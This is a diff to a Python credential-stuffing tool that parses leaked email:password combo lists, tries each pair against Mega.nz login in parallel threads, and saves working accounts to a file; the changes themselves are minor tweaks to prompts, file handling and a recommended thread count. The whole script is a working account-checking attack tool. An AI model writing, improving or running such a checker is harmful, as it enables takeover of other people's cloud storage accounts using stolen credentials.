@@ -25,14 +25,14 @@ mega = Mega()
 def Credits_and_Version():
     print("\nWritten by")
     print(pyfiglet.figlet_format("n1c0t1n3"))
-    print("v1.0")
+    print("v1.1")
 
 def IndexSelector():
     global index_null, index_one, criteria
     print("\nPlease select the indexes! Default: 0 and 1 !")
     index_null = input("\nPlease specify the first index (count from 0): ")
     index_one = input("\nPlease specify the second index (count from 0): ")
-    criteria = input("\nPlease specify the middle criteria (like ':' or '|'): ")
+    criteria = input("\nPlease specify the criteria (like ':' or '|'): ")
 
 
 def checkAccount(account):
@@ -41,13 +41,12 @@ def checkAccount(account):
         try:
             mega._login_user(account.split(str(criteria))[int(index_null)], account.split(str(criteria))[int(index_one)])
             print(bcolors.OKGREEN + "\n" + account.split(str(criteria))[int(index_null)] + bcolors.ENDC)
-            workingfile = open("working.txt", "a")
+            workingfile = open("working.txt", "w+")
             workingfile.write(account + "\n")
             workingfile.close()
         except Exception as e:
-            print("xx")
             print(bcolors.FAIL + "\n" + account.split(str(criteria))[int(index_null)] + " " + account.split(str(criteria))[int(index_one)] + bcolors.ENDC)
-            workingfile = open("failed.txt", "a")
+            workingfile = open("failed.txt", "w+")
             workingfile.write(account + "\n")
             workingfile.close()
     except:
@@ -56,7 +55,7 @@ def checkAccount(account):
 
 def Threads():
     global numThreads
-    numThreads = input("Threads: ")
+    numThreads = input("Threads (Recommended 20 Threads): ")
     freeze_support()
 
     pool = Pool(int(numThreads))
